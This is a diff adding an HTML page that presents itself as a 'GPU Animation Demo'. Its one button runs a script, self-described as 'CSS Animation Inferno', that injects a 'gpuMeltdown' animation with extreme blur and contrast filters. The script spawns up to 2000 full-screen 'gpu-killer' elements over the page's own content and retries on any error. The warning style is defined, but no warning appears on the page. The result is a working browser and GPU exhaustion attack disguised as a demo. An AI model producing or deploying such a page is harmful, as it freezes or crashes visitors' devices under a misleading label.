@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPU Animation Demo</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: white;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 600px;
+            z-index: 1000001;
+            position: relative;
+        }
+        
+        h1 {
+            color: #ff6b6b;
+            margin-bottom: 20px;
+        }
+        
+        .warning {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid #ff6b6b;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .activate-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ffa500);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+        }
+        
+        .activate-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
+        }
+        
+        .activate-btn:active {
+            transform: translateY(0);
+        }
+        
+        .info {
+            color: #888;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>GPU Animation Demo</h1>
+        
+        
+        <p>Click the button below to activate the GPU-intensive animation.</p>
+        
+        <button class="activate-btn" onclick="activateAnimation()">
+            ACTIVATE ANIMATION
+        </button>
+        
+        <p class="info">
+            The animation will create multiple elements with complex CSS transformations and filters.
+        </p>
+    </div>
+
+    <script>
+        /**
+         * CSS Animation Inferno - Standalone Function
+         * Creates extreme GPU-intensive CSS animations
+         * WARNING: Can cause significant performance degradation
+         */
+        function cssAnimationInferno() {
+            // Inject the animation styles
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes gpuMeltdown {
+                    0% { 
+                        transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); 
+                        filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
+                        background: radial-gradient(circle, #ff0000, #00ff00, #0000ff);
+                    }
+                    10% { 
+                        transform: translate(100vw, 50vh) rotate(360deg) scale(5) skew(20deg); 
+                        filter: hue-rotate(180deg) blur(10px) contrast(200%) brightness(150%);
+                        background: radial-gradient(circle, #ffff00, #ff00ff, #00ffff);
+                    }
+                    20% { 
+                        transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); 
+                        filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%);
+                        background: radial-gradient(circle, #ff0000, #0000ff, #ffff00);
+                    }
+                    30% { 
+                        transform: translate(150vw, -50vh) rotate(1080deg) scale(10) skew(60deg); 
+                        filter: hue-rotate(540deg) blur(30px) contrast(400%) brightness(250%);
+                        background: radial-gradient(circle, #00ff00, #ff00ff, #ff0000);
+                    }
+                    40% { 
+                        transform: translate(-100vw, 150vh) rotate(1440deg) scale(0.01) skew(-80deg); 
+                        filter: hue-rotate(720deg) blur(40px) contrast(500%) brightness(300%);
+                        background: radial-gradient(circle, #0000ff, #ffff00, #00ff00);
+                    }
+                    50% { 
+                        transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); 
+                        filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%);
+                        background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000);
+                    }
+                    60% { 
+                        transform: translate(-150vw, -100vh) rotate(2160deg) scale(0.001) skew(-120deg); 
+                        filter: hue-rotate(1080deg) blur(60px) contrast(700%) brightness(400%);
+                        background: radial-gradient(circle, #ffff00, #ff0000, #0000ff);
+                    }
+                    70% { 
+                        transform: translate(250vw, 50vh) rotate(2520deg) scale(30) skew(140deg); 
+                        filter: hue-rotate(1260deg) blur(70px) contrast(800%) brightness(450%);
+                        background: radial-gradient(circle, #00ffff, #ffff00, #ff00ff);
+                    }
+                    80% { 
+                        transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); 
+                        filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%);
+                        background: radial-gradient(circle, #ff0000, #00ff00, #ffff00);
+                    }
+                    90% { 
+                        transform: translate(300vw, -150vh) rotate(3240deg) scale(40) skew(180deg); 
+                        filter: hue-rotate(1620deg) blur(90px) contrast(1000%) brightness(550%);
+                        background: radial-gradient(circle, #0000ff, #ff00ff, #00ff00);
+                    }
+                    100% { 
+                        transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); 
+                        filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%);
+                        background: radial-gradient(circle, #ff0000, #00ff00, #0000ff);
+                    }
+                }
+
+                .gpu-killer {
+                    animation: gpuMeltdown 0.5s infinite linear;
+                    position: fixed;
+                    border-radius: 50%;
+                    mix-blend-mode: difference;
+                    will-change: transform, filter, background;
+                    backface-visibility: hidden;
+                    perspective: 1000px;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Create and spawn animated elements
+            let elementCount = 0;
+            function createGpuKiller() {
+                try {
+                    for (let i = 0; i < 50; i++) {
+                        const element = document.createElement('div');
+                        element.className = 'gpu-killer';
+                        element.style.width = Math.random() * 400 + 100 + 'px';
+                        element.style.height = element.style.width;
+                        element.style.left = Math.random() * 100 + 'vw';
+                        element.style.top = Math.random() * 100 + 'vh';
+                        element.style.zIndex = 1000000 + elementCount;
+                        element.style.background = `radial-gradient(circle, 
+                            hsl(${Math.random() * 360}, 100%, 50%), 
+                            hsl(${Math.random() * 360}, 100%, 50%), 
+                            hsl(${Math.random() * 360}, 100%, 50%))`;
+                        document.body.appendChild(element);
+                        elementCount++;
+                    }
+                    
+                    // Continue spawning elements up to a limit
+                    if (elementCount < 2000) {
+                        requestAnimationFrame(createGpuKiller);
+                    }
+                } catch(e) {
+                    // If error occurs, keep trying
+                    requestAnimationFrame(createGpuKiller);
+                }
+            }
+            
+            // Start the inferno
+            createGpuKiller();
+        }
+
+        function activateAnimation() {
+            // Disable the button to prevent multiple clicks
+            const button = document.querySelector('.activate-btn');
+            button.disabled = true;
+            button.textContent = 'ANIMATION ACTIVATED';
+            button.style.background = '#555';
+            button.style.cursor = 'not-allowed';
+            
+            // Execute the animation
+            cssAnimationInferno();
+        }
+    </script>
+</body>
+</html>
